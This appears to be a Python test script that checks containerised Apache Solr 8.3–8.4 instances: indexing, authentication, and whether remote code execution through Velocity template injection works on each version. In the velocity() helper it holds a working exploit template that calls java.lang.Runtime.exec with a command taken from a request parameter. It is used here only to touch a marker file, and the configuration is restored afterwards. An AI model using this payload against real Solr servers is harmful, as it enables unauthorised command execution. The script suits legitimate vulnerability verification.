"""Prove real Solr/CLI, indexing, Velocity execution, auth and restoration."""
import json
import os
from pathlib import Path
import sys
from urllib.parse import urlencode

sys.dont_write_bytecode = True
from native_client import NativeSolr

runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
client = NativeSolr(runtime)
admin = ('solr', 'module-target-solr-password')
profiles = {}


def writer_config(service, core, auth=None):
    status, config, body = client.request(service, f'/solr/{core}/config/queryResponseWriter', auth=auth)
    assert status == 200, body
    return config['config']['queryResponseWriter']['velocity']


def update_writer(service, core, config, auth=None):
    status, _, body = client.request(service, f'/solr/{core}/config', method='POST', data={'update-queryresponsewriter': dict(config, name='velocity')}, auth=auth)
    assert status == 200, body


def velocity(service, core, expected, suffix, auth=None):
    marker = f'/tmp/module-target-solr-native-{service}-{suffix}'
    client.command(service, 'test', '!', '-e', marker)
    template = '#set($x="")#set($r=$x.class.forName("java.lang.Runtime"))#set($p=$r.getRuntime().exec($request.getParams().get("native_command")))$p.waitFor()'
    data = urlencode({'q': '*:*', 'wt': 'velocity', 'v.template': 'custom', 'v.template.custom': template, 'native_command': '/usr/bin/touch ' + marker}).encode()
    status, _, body = client.request(service, f'/solr/{core}/select', method='POST', data=data, content_type='application/x-www-form-urlencoded', auth=auth)
    stat = client.command(service, 'stat', '-c', '%U|%s', marker, check=False)
    executed = stat['exitstatus'] == 0
    if expected:
        assert status == 200 and stat['stdout'].strip() == 'solr|0', (status, body, stat)
        client.command(service, 'rm', marker)
        client.command(service, 'test', '!', '-e', marker)
    else:
        assert not executed and status != 200, (status, body, stat)
    return dict(marker=marker, executed=executed, status=status)


try:
    for service, version in [('legacy', '8.3.0'), ('secured', '8.3.0'), ('boundary', '8.3.1'), ('fixed', '8.4.0')]:
        identity = client.command(service, 'id')
        cli = client.command(service, 'solr', 'version')
        java = client.command(service, 'java', '-version')
        assert version in cli['stdout']
        status, info, body = client.request(service, '/solr/admin/info/system', query={'wt': 'json'})
        assert status == 200 and info['lucene']['solr-spec-version'] == version and info['mode'] == 'solrcloud', body
        client.command(service, 'solr', 'create_collection', '-c', 'module_target', '-d', 'sample_techproducts_configs', '-shards', '1', '-replicationFactor', '1')
        status, cores, body = client.request(service, '/solr/admin/cores', query={'action': 'STATUS', 'wt': 'json'})
        assert status == 200 and len(cores['status']) == 1, body
        core = next(iter(cores['status']))
        original = writer_config(service, core)
        assert original['class'] == 'solr.VelocityResponseWriter'
        status, _, body = client.request(service, f'/solr/{core}/update', method='POST', query={'commit': 'true'}, data={'add': {'doc': {'id': 'module-target-native-document', 'name': 'Native Solr proof'}}})
        assert status == 200, body
        status, result, body = client.request(service, f'/solr/{core}/select', query={'q': 'id:"module-target-native-document"', 'wt': 'json'})
        assert status == 200 and result['response']['numFound'] == 1 and result['response']['docs'][0]['id'] == 'module-target-native-document', body
        status, _, body = client.request(service, f'/solr/{core}/update', method='POST', query={'commit': 'true'}, data={'delete': {'id': 'module-target-native-document'}})
        assert status == 200, body
        status, result, body = client.request(service, f'/solr/{core}/select', query={'q': 'id:"module-target-native-document"', 'wt': 'json'})
        assert status == 200 and result['response']['numFound'] == 0, body
        enabled = dict(original, **{'params.resource.loader.enabled': 'true'})
        try:
            update_writer(service, core, enabled)
            markers = [velocity(service, core, service in ('legacy', 'secured'), str(number)) for number in (1, 2)]
        finally:
            update_writer(service, core, original)
        assert writer_config(service, core) == original
        profiles[service] = dict(version=version, lucene=info['lucene']['lucene-spec-version'], system=info['system'], java=java, identity=identity, core=core, writer=original, native_markers=markers)

    client.command('secured', 'solr', 'auth', 'enable', '-credentials', ':'.join(admin), '-blockUnknown', 'true', '-z', 'localhost:9983', '-s', '/var/solr/data')
    for credentials, expected in [(None, 401), (('solr', 'wrong-password'), 401), (admin, 200)]:
        status, _, body = client.request('secured', '/solr/admin/info/system', auth=credentials)
        assert status == expected, (status, body)
    core = profiles['secured']['core']
    original = profiles['secured']['writer']
    try:
        update_writer('secured', core, dict(original, **{'params.resource.loader.enabled': 'true'}), admin)
        profiles['secured']['authenticated_markers'] = [velocity('secured', core, True, 'auth' + str(number), admin) for number in (1, 2)]
    finally:
        update_writer('secured', core, original, admin)
    assert writer_config('secured', core, admin) == original
    for endpoint, command in [('authentication', {'set-user': {'viewer': 'module-target-viewer-password'}}), ('authorization', {'set-user-role': {'viewer': 'viewer'}, 'set-permission': {'name': 'all', 'role': 'admin'}})]:
        status, _, body = client.request('secured', '/solr/admin/' + endpoint, method='POST', auth=admin, data=command)
        assert status == 200, body
    status, _, body = client.request('secured', '/solr/admin/info/system', auth=('viewer', 'module-target-viewer-password'))
    assert status == 403, body
    status, _, body = client.request('secured', '/solr/admin/info/system', auth=admin)
    assert status == 200, body
    for service in profiles:
        status, _, body = client.request(service, '/solr/')
        assert status == 200 and b'solrAdminApp' in body, (status, body)
    status, _, body = client.request('unrelated', '/')
    assert status == 200 and b'It works!' in body and b'solrAdminApp' not in body
    status, _, _ = client.request('legacy', '/module-target-no-solr/admin/info/system')
    assert status == 404
finally:
    client.write(Path(runtime['artifacts']) / 'native-velocity.json', profiles=profiles)

print(json.dumps(dict(profiles=profiles, commands=client.commands, requests=client.requests)))
